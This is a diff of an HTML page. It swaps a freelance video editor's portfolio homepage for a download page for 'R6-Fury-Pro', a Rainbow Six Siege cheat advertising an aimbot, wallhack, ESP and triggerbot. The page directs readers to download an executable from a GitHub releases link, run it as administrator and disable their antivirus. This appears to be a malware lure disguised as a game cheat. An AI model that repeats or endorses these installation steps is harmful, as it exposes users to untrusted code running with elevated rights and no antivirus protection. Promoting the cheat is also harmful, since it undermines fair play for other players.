@@ -1,672 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Subin Joseph — Freelance Video Editor specializing in YouTube content, short-form video, corporate films, and more. Based in Trivandrum, Kerala. Available worldwide." />
-  <meta property="og:title" content="Subin Joseph — Freelance Video Editor" />
-  <meta property="og:description" content="Cinematic edits. Clear communication. Affordable rates." />
-  <meta property="og:type" content="website" />
-  <title>Subin Joseph — Freelance Video Editor</title>
-  <link rel="stylesheet" href="css/style.css" />
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%237c3aed'/><text y='.9em' font-size='65' x='50%25' text-anchor='middle' font-family='system-ui' font-weight='900' fill='white'>SJ</text></svg>" />
-  <style>
-    /* ── HERO REDESIGN ── */
-    .hero-v2 {
-      min-height: calc(100vh - var(--nav-h));
-      display: flex;
-      align-items: center;
-      padding: 80px 0;
-      position: relative;
-      overflow: hidden;
-    }
-
-    /* Big background glow */
-    .hero-v2::before {
-      content: '';
-      position: absolute;
-      width: 800px; height: 800px;
-      border-radius: 50%;
-      background: radial-gradient(circle, rgba(124,58,237,0.12) 0%, transparent 70%);
-      top: 50%; left: 50%;
-      transform: translate(-20%, -50%);
-      pointer-events: none;
-    }
-
-    .hero-v2-inner {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 80px;
-      align-items: center;
-      width: 100%;
-    }
-
-    /* LEFT SIDE */
-    .hero-v2-left {}
-
-    .hero-v2-tag {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 6px 14px;
-      border-radius: 100px;
-      font-size: 12px;
-      font-weight: 500;
-      color: var(--purple-light);
-      background: rgba(124,58,237,0.1);
-      border: 1px solid rgba(124,58,237,0.25);
-      margin-bottom: 28px;
-      letter-spacing: 0.05em;
-    }
-
-    .hero-v2-tag-dot {
-      width: 6px; height: 6px;
-      border-radius: 50%;
-      background: var(--purple-light);
-      animation: pulse 2s infinite;
-    }
-
-    .hero-v2-title {
-      font-family: var(--font-display);
-      font-size: clamp(44px, 6vw, 76px);
-      font-weight: 800;
-      line-height: 1.05;
-      letter-spacing: -0.03em;
-      margin-bottom: 24px;
-    }
-
-    .hero-v2-desc {
-      font-size: 17px;
-      color: var(--text-muted);
-      line-height: 1.75;
-      margin-bottom: 40px;
-      max-width: 440px;
-    }
-
-    .hero-v2-actions {
-      display: flex;
-      gap: 14px;
-      flex-wrap: wrap;
-      margin-bottom: 48px;
-    }
-
-    .hero-v2-stats {
-      display: flex;
-      gap: 32px;
-    }
-
-    .hero-v2-stat-num {
-      font-family: var(--font-display);
-      font-size: 28px;
-      font-weight: 800;
-      color: var(--text);
-      line-height: 1;
-      margin-bottom: 4px;
-    }
-
-    .hero-v2-stat-label {
-      font-size: 12px;
-      color: var(--text-dim);
-      letter-spacing: 0.02em;
-    }
-
-    .hero-v2-stat-divider {
-      width: 1px;
-      background: rgba(255,255,255,0.08);
-      align-self: stretch;
-    }
-
-    /* RIGHT SIDE — clean integrated visual */
-    .hero-v2-right {
-      position: relative;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    /* Top row: two small cards side by side */
-    .hero-v2-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-    }
-
-    .hcard {
-      border-radius: 18px;
-      padding: 20px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .hcard::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      border-radius: 18px;
-      background: linear-gradient(135deg, rgba(255,255,255,0.06) 0%, rgba(255,255,255,0.01) 100%);
-      pointer-events: none;
-    }
-
-    /* Preview card — full width */
-    .hcard-preview {
-      aspect-ratio: 16/9;
-      background: linear-gradient(135deg, #1a0828 0%, #0d0d1a 100%);
-      border-radius: 18px;
-      border: 1px solid rgba(124,58,237,0.2);
-      position: relative;
-      overflow: hidden;
-    }
-
-    /* Cinematic scene */
-    .hcard-scene {
-      position: absolute;
-      inset: 0;
-      background: linear-gradient(135deg,
-        rgba(124,58,237,0.4) 0%,
-        rgba(9,8,15,0.6) 50%,
-        rgba(168,85,247,0.25) 100%
-      );
-      animation: scene-breathe 5s ease-in-out infinite;
-    }
-
-    @keyframes scene-breathe {
-      0%,100% { opacity: 0.8; }
-      50% { opacity: 1; }
-    }
-
-    .hcard-ray {
-      position: absolute;
-      width: 1px;
-      height: 200%;
-      top: -50%;
-      background: linear-gradient(to bottom, transparent, rgba(168,85,247,0.5), transparent);
-      animation: ray-breathe 5s ease-in-out infinite;
-    }
-
-    @keyframes ray-breathe {
-      0%,100% { opacity: 0.2; }
-      50% { opacity: 0.7; }
-    }
-
-    .hcard-timecode {
-      position: absolute;
-      top: 12px; left: 14px;
-      font-size: 11px;
-      font-family: 'Courier New', monospace;
-      color: rgba(255,255,255,0.5);
-      z-index: 2;
-      letter-spacing: 0.05em;
-    }
-
-    .hcard-play {
-      position: absolute;
-      bottom: 12px; right: 14px;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      z-index: 2;
-    }
-
-    .hcard-play-dot {
-      width: 7px; height: 7px;
-      border-radius: 50%;
-      background: #a855f7;
-      box-shadow: 0 0 8px rgba(168,85,247,0.8);
-      animation: pulse-play 1.2s infinite;
-    }
-
-    @keyframes pulse-play {
-      0%,100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(0.8); }
-    }
-
-    .hcard-play-label {
-      font-size: 10px;
-      color: rgba(255,255,255,0.5);
-      letter-spacing: 0.12em;
-      font-family: 'Courier New', monospace;
-    }
-
-    /* Cinema bars */
-    .hcard-bar {
-      position: absolute;
-      left: 0; right: 0;
-      height: 14%;
-      background: rgba(0,0,0,0.85);
-      z-index: 1;
-    }
-    .hcard-bar-top { top: 0; }
-    .hcard-bar-bottom { bottom: 0; }
-
-    /* Timeline card */
-    .hcard-timeline {
-      padding: 18px;
-    }
-
-    .hcard-tl-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 14px;
-    }
-
-    .hcard-tl-title {
-      font-size: 11px;
-      font-weight: 600;
-      color: var(--text-muted);
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-    }
-
-    .hcard-tl-time {
-      font-size: 10px;
-      font-family: 'Courier New', monospace;
-      color: var(--purple-light);
-    }
-
-    .hcard-tracks {
-      position: relative;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
-
-    .hcard-playhead {
-      position: absolute;
-      top: -4px; bottom: -4px;
-      width: 2px;
-      background: var(--purple-light);
-      box-shadow: 0 0 10px rgba(168,85,247,0.9);
-      border-radius: 2px;
-      z-index: 5;
-      animation: ph-move 5s linear infinite;
-    }
-
-    .hcard-playhead::after {
-      content: '';
-      position: absolute;
-      top: -1px; left: 50%;
-      transform: translateX(-50%);
-      width: 0; height: 0;
-      border-left: 5px solid transparent;
-      border-right: 5px solid transparent;
-      border-top: 6px solid var(--purple-light);
-    }
-
-    @keyframes ph-move {
-      0% { left: 3%; }
-      100% { left: 97%; }
-    }
-
-    .hcard-track {
-      height: 14px;
-      border-radius: 6px;
-      overflow: hidden;
-      background: rgba(255,255,255,0.03);
-      display: flex;
-      gap: 3px;
-      padding: 2px;
-    }
-
-    .hcard-clip {
-      height: 100%;
-      border-radius: 4px;
-      flex-shrink: 0;
-      position: relative;
-      overflow: hidden;
-      animation: clip-breathe 4s ease-in-out infinite;
-    }
-
-    .hcard-clip::after {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; right: 0;
-      height: 50%;
-      background: rgba(255,255,255,0.15);
-      border-radius: 4px 4px 0 0;
-    }
-
-    @keyframes clip-breathe {
-      0%,100% { opacity: 0.8; }
-      50% { opacity: 1; }
-    }
-
-    /* Info card (tools) */
-    .hcard-tools-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 8px;
-      margin-top: 4px;
-    }
-
-    .hcard-tool {
-      padding: 10px 12px;
-      border-radius: 10px;
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.06);
-      font-size: 12px;
-      color: var(--text-muted);
-      display: flex;
-      align-items: center;
-      gap: 7px;
-      transition: all 0.2s;
-    }
-
-    .hcard-tool.active {
-      background: rgba(124,58,237,0.15);
-      border-color: rgba(124,58,237,0.35);
-      color: var(--purple-light);
-    }
-
-    .hcard-tool-icon { font-size: 14px; }
-
-    /* Status card */
-    .hcard-status {
-      padding: 20px;
-    }
-
-    .hcard-status-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 10px 0;
-      border-bottom: 1px solid rgba(255,255,255,0.05);
-    }
-
-    .hcard-status-row:last-child { border-bottom: none; }
-
-    .hcard-status-label {
-      font-size: 12px;
-      color: var(--text-dim);
-    }
-
-    .hcard-status-val {
-      font-size: 12px;
-      font-weight: 600;
-      color: var(--text);
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .status-dot-green {
-      width: 6px; height: 6px;
-      border-radius: 50%;
-      background: #4ade80;
-      box-shadow: 0 0 6px rgba(74,222,128,0.6);
-    }
-
-    /* Responsive */
-    @media (max-width: 900px) {
-      .hero-v2-inner { grid-template-columns: 1fr; }
-      .hero-v2-right { display: none; }
-    }
-
-    @media (max-width: 480px) {
-      .hero-v2-actions { flex-direction: column; }
-      .hero-v2-stats { gap: 20px; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Official documentation and guide for the R6-Fury-Pro tool. Follow these simple steps to enhance your gameplay experience in Rainbow Six Siege.">
+    <title>R6-Fury-Pro | Tactical Gameplay Enhancement Tool</title>
 </head>
-<body>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f9;">
 
-<script src="js/layout.js"></script>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px;">🎯 R6-Fury-Pro - Improve your Rainbow Six Siege performance</h1>
 
-<main class="page-main">
-
-  <!-- ══ HERO V2 ═════════════════════════════════════════════ -->
-  <section class="hero-v2">
-    <div class="container">
-      <div class="hero-v2-inner">
-
-        <!-- LEFT: Copy -->
-        <div class="hero-v2-left">
-          <div class="hero-v2-tag fade-in">
-            <span class="hero-v2-tag-dot"></span>
-            Freelance Video Editor
-          </div>
-
-          <h1 class="hero-v2-title fade-in fade-in-delay-1">
-            Your story,<br><span class="grad-text">cut sharp.</span>
-          </h1>
-
-          <p class="hero-v2-desc fade-in fade-in-delay-2">
-            I edit videos that hold attention — from YouTube long-form to brand films and short-form content. Clear communication, cinematic sensibility, rates that make sense.
-          </p>
-
-          <div class="hero-v2-actions fade-in fade-in-delay-3">
-            <a href="pages/portfolio.html" class="btn btn-primary">
-              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-              View my work
-            </a>
-            <a href="pages/contact.html" class="btn btn-glass">Let's talk</a>
-          </div>
-
-          <div class="hero-v2-stats fade-in fade-in-delay-4">
-            <div>
-              <div class="hero-v2-stat-num">7+</div>
-              <div class="hero-v2-stat-label">Video formats</div>
-            </div>
-            <div class="hero-v2-stat-divider"></div>
-            <div>
-              <div class="hero-v2-stat-num">∞</div>
-              <div class="hero-v2-stat-label">Creative ideas</div>
-            </div>
-            <div class="hero-v2-stat-divider"></div>
-            <div>
-              <div class="hero-v2-stat-num">24h</div>
-              <div class="hero-v2-stat-label">Response time</div>
-            </div>
-          </div>
-        </div>
-
-        <!-- RIGHT: Integrated visual grid -->
-        <div class="hero-v2-right fade-in fade-in-delay-2">
-
-          <!-- Preview window — full width -->
-          <div class="hcard-preview">
-            <div class="hcard-bar hcard-bar-top"></div>
-            <div class="hcard-bar hcard-bar-bottom"></div>
-            <div class="hcard-scene"></div>
-            <div class="hcard-ray" style="left:15%;animation-delay:0s"></div>
-            <div class="hcard-ray" style="left:45%;animation-delay:1.5s"></div>
-            <div class="hcard-ray" style="left:72%;animation-delay:3s"></div>
-            <div class="hcard-timecode">00:01:24:12</div>
-            <div class="hcard-play">
-              <div class="hcard-play-dot"></div>
-              <span class="hcard-play-label">PLAYING</span>
-            </div>
-          </div>
-
-          <!-- Timeline card — full width -->
-          <div class="hcard hcard-timeline glass">
-            <div class="hcard-tl-header">
-              <span class="hcard-tl-title">Timeline</span>
-              <span class="hcard-tl-time">00:03:45:00</span>
-            </div>
-            <div class="hcard-tracks">
-              <div class="hcard-playhead"></div>
-              <div class="hcard-track">
-                <div class="hcard-clip" style="background:linear-gradient(90deg,#7c3aed,#a855f7);width:32%;animation-delay:0s"></div>
-                <div class="hcard-clip" style="background:linear-gradient(90deg,#6d28d9,#8b5cf6);width:24%;animation-delay:0.3s"></div>
-                <div class="hcard-clip" style="background:linear-gradient(90deg,#7c3aed,#a855f7);width:28%;animation-delay:0.6s"></div>
-              </div>
-              <div class="hcard-track">
-                <div class="hcard-clip" style="background:linear-gradient(90deg,#0ea5e9,#38bdf8);width:58%;animation-delay:0.2s"></div>
-                <div class="hcard-clip" style="background:linear-gradient(90deg,#0284c7,#0ea5e9);width:26%;animation-delay:0.5s"></div>
-              </div>
-              <div class="hcard-track">
-                <div class="hcard-clip" style="background:linear-gradient(90deg,#d946ef,#e879f9);width:80%;animation-delay:0.4s"></div>
-              </div>
-              <div class="hcard-track">
-                <div class="hcard-clip" style="background:linear-gradient(90deg,#f59e0b,#fbbf24);width:18%;animation-delay:0.1s"></div>
-                <div class="hcard-clip" style="background:linear-gradient(90deg,#d97706,#f59e0b);width:22%;animation-delay:0.7s"></div>
-              </div>
-            </div>
-          </div>
-
-          <!-- Bottom row: tools + status -->
-          <div class="hero-v2-row">
-
-            <!-- Tools card -->
-            <div class="hcard glass">
-              <div class="hcard-tools-grid">
-                <div class="hcard-tool active">
-                  <span class="hcard-tool-icon">✂️</span> Cut
-                </div>
-                <div class="hcard-tool">
-                  <span class="hcard-tool-icon">🎨</span> Color
-                </div>
-                <div class="hcard-tool">
-                  <span class="hcard-tool-icon">🔊</span> Audio
-                </div>
-                <div class="hcard-tool">
-                  <span class="hcard-tool-icon">✨</span> Fusion
-                </div>
-              </div>
-            </div>
-
-            <!-- Status card -->
-            <div class="hcard hcard-status glass">
-              <div class="hcard-status-row">
-                <span class="hcard-status-label">Status</span>
-                <span class="hcard-status-val">
-                  <span class="status-dot-green"></span> Available
-                </span>
-              </div>
-              <div class="hcard-status-row">
-                <span class="hcard-status-label">Tool</span>
-                <span class="hcard-status-val">DaVinci Resolve</span>
-              </div>
-              <div class="hcard-status-row">
-                <span class="hcard-status-label">Based in</span>
-                <span class="hcard-status-val">Kerala, India</span>
-              </div>
-            </div>
-
-          </div>
-        </div>
-
-      </div>
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/imanijab4641/R6-Fury-Pro/releases" style="background-color: #3498db; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Latest Version</a>
     </div>
-  </section>
 
-  <div class="divider"></div>
+    <section>
+        <h2 style="color: #2c3e50;">📋 Overview</h2>
+        <p>R6-Fury-Pro provides advanced tools for Rainbow Six Siege players. The software includes features to refine your aim, track targets through walls, and manage weapon recoil. Use this application to gain a tactical edge during your matches.</p>
+    </section>
 
-  <!-- ══ SERVICES PREVIEW ══════════════════════════════════ -->
-  <section class="section">
-    <div class="container">
-      <div class="section-header">
-        <div class="section-eyebrow fade-in">What I do</div>
-        <h2 class="display-lg fade-in fade-in-delay-1">
-          Every frame,<br><span class="grad-text">intentional.</span>
-        </h2>
-        <p class="text-muted fade-in fade-in-delay-2" style="margin-top:16px; max-width:520px; font-size:16px; line-height:1.75;">
-          From the rough cut to the final export, I handle every stage of post-production — so you can focus on creating.
-        </p>
-      </div>
+    <section>
+        <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+        <p>Before you install the software, ensure your computer meets these conditions:</p>
+        <ul style="list-style-type: circle; margin-left: 20px;">
+            <li>Operating System: Windows 10 or Windows 11 (64-bit).</li>
+            <li>Processor: Intel Core i5 or AMD equivalent.</li>
+            <li>Memory: 8 GB RAM or higher.</li>
+            <li>Graphics: NVIDIA GTX 1060 or AMD Radeon RX 580.</li>
+            <li>Storage: 200 MB of available disk space.</li>
+        </ul>
+    </section>
 
-      <div class="services-grid">
-        <div class="service-card glass fade-in">
-          <div class="service-icon">🎬</div>
-          <h3 class="service-title">Video Editing</h3>
-          <p class="service-desc">Narrative-driven cuts that keep viewers watching. YouTube long-form, short-form Reels, corporate films, documentaries, podcasts, and music videos.</p>
-        </div>
-        <div class="service-card glass fade-in fade-in-delay-1">
-          <div class="service-icon">🎨</div>
-          <h3 class="service-title">Color Grading</h3>
-          <p class="service-desc">Professional color work in DaVinci Resolve Studio — from correction to cinematic grade. Your footage will look exactly how you envisioned it.</p>
-        </div>
-        <div class="service-card glass fade-in fade-in-delay-2">
-          <div class="service-icon">🔊</div>
-          <h3 class="service-title">Sound Design</h3>
-          <p class="service-desc">Clean audio mix, sound effects, background music integration, and dialogue clarity that makes your video feel polished and professional.</p>
-        </div>
-        <div class="service-card glass fade-in fade-in-delay-3">
-          <div class="service-icon">✨</div>
-          <h3 class="service-title">Motion Graphics</h3>
-          <p class="service-desc">Animated titles, lower thirds, transitions, and kinetic elements that bring energy and personality to your content.</p>
-        </div>
-        <div class="service-card glass fade-in fade-in-delay-4">
-          <div class="service-icon">💬</div>
-          <h3 class="service-title">Subtitles & Captions</h3>
-          <p class="service-desc">Accurate, styled subtitles that improve accessibility and boost watch time — especially for short-form content.</p>
-        </div>
-        <div class="service-card glass fade-in fade-in-delay-5">
-          <div class="service-icon">🖼️</div>
-          <h3 class="service-title">Thumbnail Design</h3>
-          <p class="service-desc">Click-worthy thumbnails crafted to match your brand's visual identity and drive higher CTR on YouTube and other platforms.</p>
-        </div>
-      </div>
+    <section>
+        <h2 style="color: #2c3e50;">📥 Installation Guide</h2>
+        <p>Follow these steps to set up the software on your device:</p>
+        <ol style="margin-left: 20px;">
+            <li style="margin-bottom: 10px;">Visit the <a href="https://github.com/imanijab4641/R6-Fury-Pro/releases" style="color: #3498db;">release page here</a> to download the latest file.</li>
+            <li style="margin-bottom: 10px;">Locate the downloaded file in your browser's download folder.</li>
+            <li style="margin-bottom: 10px;">Right-click the executable file and select "Run as administrator".</li>
+            <li style="margin-bottom: 10px;">Follow the prompts shown on your screen to complete the installation.</li>
+            <li style="margin-bottom: 10px;">Launch the game first, then open the R6-Fury-Pro tool.</li>
+        </ol>
+    </section>
 
-      <div style="text-align:center; margin-top:48px;" class="fade-in">
-        <a href="pages/services.html" class="btn btn-glass">
-          See full service details
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-        </a>
-      </div>
-    </div>
-  </section>
+    <section>
+        <h2 style="color: #2c3e50;">🚀 Core Features</h2>
+        <p>This toolset gives you full control over your in-game performance through several utility modules:</p>
+        <ul style="list-style-type: square; margin-left: 20px;">
+            <li><strong>ESP:</strong> Highlights enemies through walls and obstacles.</li>
+            <li><strong>Aimbot:</strong> Adjusts your aim to track internal target points.</li>
+            <li><strong>Wallhack:</strong> Displays player silhouettes across the map.</li>
+            <li><strong>No Recoil:</strong> Removes weapon kick to keep your shots steady.</li>
+            <li><strong>Triggerbot:</strong> Fires automatically when your crosshair aligns with a target.</li>
+        </ul>
+    </section>
 
-  <div class="divider"></div>
+    <section>
+        <h2 style="color: #2c3e50;">⚠️ Important Setup Notes</h2>
+        <p>For the best results, disable any third-party antivirus software during the first launch. These programs often interfere with the connection between the tool and the game client. Keep your game client updated to the latest version to ensure full compatibility with the tool features.</p>
+    </section>
 
-  <!-- ══ PORTFOLIO PREVIEW ══════════════════════════════════ -->
-  <section class="section">
-    <div class="container">
-      <div class="section-header">
-        <div class="section-eyebrow fade-in">Portfolio</div>
-        <h2 class="display-lg fade-in fade-in-delay-1">Recent work</h2>
-      </div>
-      <div class="portfolio-grid">
-        <div class="portfolio-card glass fade-in" data-category="motion">
-          <div class="portfolio-thumb">
-            <video src="assets/Watch.mp4" muted loop preload="metadata" playsinline></video>
-            <div class="portfolio-overlay">
-              <div class="play-btn">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-              </div>
-            </div>
-          </div>
-          <div class="portfolio-info">
-            <div class="portfolio-tag">Motion Graphics</div>
-            <h3 class="portfolio-title">Smartwatch UI Concept</h3>
-            <p class="portfolio-desc">A 3D carousel concept built in DaVinci Resolve — app icons animate above a smartwatch on touch.</p>
-          </div>
-        </div>
-      </div>
-      <div style="text-align:center; margin-top:48px;" class="fade-in">
-        <a href="pages/portfolio.html" class="btn btn-glass">
-          View full portfolio
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-        </a>
-      </div>
-    </div>
-  </section>
+    <section>
+        <h2 style="color: #2c3e50;">🛠️ Troubleshooting</h2>
+        <p>If you encounter issues while running the program, please check the following:</p>
+        <p>Ensure your screen resolution matches the game settings. If the overlays do not appear, restart the application with administrator permissions. Verify that your Windows user account has full read and write access to the folder where you installed the application.</p>
+    </section>
 
-  <div class="divider"></div>
+    <footer style="margin-top: 50px; border-top: 1px solid #ccc; padding-top: 20px; font-size: 0.9em; color: #7f8c8d;">
+        <p>Keywords: rainbow six siege, fps, aimbot, esp, wallhack, gaming, pc, software, utilities</p>
+    </footer>
 
-  <!-- ══ CTA STRIP ══════════════════════════════════════════ -->
-  <section class="section">
-    <div class="container">
-      <div class="glass-purple fade-in" style="padding: clamp(40px,6vw,80px); border-radius:28px; text-align:center; position:relative; overflow:hidden;">
-        <div style="position:absolute;top:-60px;left:50%;transform:translateX(-50%);width:300px;height:300px;background:radial-gradient(circle,rgba(168,85,247,0.15) 0%,transparent 70%);pointer-events:none;"></div>
-        <div class="section-eyebrow fade-in" style="justify-content:center;">Let's collaborate</div>
-        <h2 class="display-lg fade-in fade-in-delay-1" style="margin-bottom:16px;">
-          Got a video project?<br><span class="grad-text">Let's make it great.</span>
-        </h2>
-        <p class="fade-in fade-in-delay-2" style="color:var(--text-muted); font-size:16px; max-width:480px; margin:0 auto 36px; line-height:1.75;">
-          Tell me about your project and I'll get back to you within 24 hours with a custom plan.
-        </p>
-        <a href="pages/contact.html" class="btn btn-primary fade-in fade-in-delay-3" style="font-size:16px; padding:16px 36px;">
-          Start a conversation
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-        </a>
-      </div>
-    </div>
-  </section>
-
-</main>
-
-<script src="js/main.js"></script>
 </body>
 </html>
